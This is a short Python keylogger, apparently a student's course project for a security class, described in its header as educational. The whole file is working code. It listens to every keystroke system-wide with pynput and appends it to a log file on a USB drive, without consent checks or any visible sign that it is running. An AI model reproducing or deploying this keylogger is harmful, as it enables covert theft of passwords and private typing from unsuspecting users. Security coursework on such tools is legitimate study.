# Hardware Keylogger
# Built by Agrim Shakergaye (z5421172) for COMP6441 project
# Only being used for educational purposes

import sys
import pynput.keyboard

log = ""
usb_path = "/Volumes/AGGERS/comp6441/usb_log.txt" 

def write_log(log_text):
    try:
        with open(usb_path, "a") as file:
            file.write(log_text)
    except:
        print("Error writing to USB!")
    
def create_log(key):
    global log

    if hasattr(key, 'char') and key.char is not None:
        char = key.char
    else:
        if key == key.enter:
            char = "\n"
        elif key == key.space:
            char = " "
        elif key in {key.shift, key.shift_r, key.ctrl_l, key.ctrl_r, key.alt_l, key.alt_r}:
            char = ""
        elif key == key.backspace:
            log = log[:-1]
            return
        else:
            char = f"[{key.name}]" if hasattr(key, "name") else f"[{key}]"

    log = log + char
    write_log(char[-1:])
    

try:
    with pynput.keyboard.Listener(on_press = create_log) as key_scanner:
        key_scanner.join()

except KeyboardInterrupt:
    print("\n[!] Keylogger stopped.")
    sys.exit(0)